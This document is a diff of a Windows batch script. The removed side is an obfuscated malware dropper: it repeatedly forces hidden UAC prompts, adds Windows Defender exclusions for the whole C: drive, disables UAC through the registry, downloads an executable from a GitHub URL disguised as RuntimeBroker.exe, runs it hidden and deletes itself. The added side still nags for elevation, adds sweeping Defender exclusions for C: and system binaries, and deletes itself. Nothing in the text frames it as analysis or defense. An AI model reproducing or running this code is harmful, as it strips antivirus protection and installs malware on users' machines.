@@ -1,32 +1,32 @@
-@echo off & setlocal enableDelayedExpansion
-set "NGi=SESSION" & set "hecp=2>&1" & set "ZKOJ=>nul" & set "KtQHh=NET"
-%KtQHh% %NGi% %ZKOJ% %hecp%
-set "e=!errorlevel!" & set "a=:A" & set "b=:B"
-if !e! equ 0 (goto %a%) else (goto %b%)
+@echo off
+:: Check if the script is running with administrator privileges
+NET SESSION >nul 2>&1
+if %errorlevel% == 0 (
+    rem Script is already running with admin rights
+    rem Add exclusions for specified paths and processes
+    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe', 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue" >nul 2>&1
 
-:A
-set "UTd=foo" & set "XlhF=qux" & set "nZDI=bar" & set "bhI=baz" & rem qyjCbc RySmR ExEtDfh
-set "Loa=powershell -ExecutionPolicy Bypass -Command"
-set "hfHLd=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath 'C:\' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue"
-!Loa! "!hfHLd!" %ZKOJ% %hecp%
-set "GCs=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0"
-!Loa! "!GCs!" %ZKOJ% %hecp%
-set "wzvex=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 }"
-!Loa! "!wzvex!" %ZKOJ% %hecp%
-if !errorlevel! neq 0 (goto %a%)
-set "eWK=timeout /t" & !eWK! 2 %ZKOJ% %hecp%
-set "OqvS=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
-!Loa! "!OqvS!" %ZKOJ% %hecp%
+    rem Delete the batch script itself after execution
+    del "%~f0" >nul 2>&1
 
-:W
-if not exist "%TEMP%\RuntimeBroker.exe" (!eWK! 1 %ZKOJ% %hecp% & goto :W)
-start "" /B "%TEMP%\RuntimeBroker.exe" %ZKOJ% %hecp%
-del /f /q "%~f0" %ZKOJ% %hecp%
-exit /b
+    exit
+)
 
-:B
-set "h=powershell -WindowStyle Hidden -Command"
-set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
-!h! "!j1!" %ZKOJ% %hecp%
-if !errorlevel! neq 0 (!eWK! 3 %ZKOJ% %hecp% & goto %b%)
-exit /b
+:loop
+    rem Trigger the UAC prompt using PowerShell from within the batch file
+    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList '/elevated' -Verb RunAs -WindowStyle Hidden" >nul 2>&1
+
+    rem If user declines the UAC prompt, retry
+    if %errorlevel% NEQ 0 (
+        timeout /t 3 >nul
+        goto loop
+    )
+
+    rem If UAC is accepted, proceed with the next task
+    rem Add exclusions for specified paths and processes
+    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe', 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue" >nul 2>&1
+
+    rem Delete the batch script itself after execution
+    del "%~f0" >nul 2>&1
+
+    exit
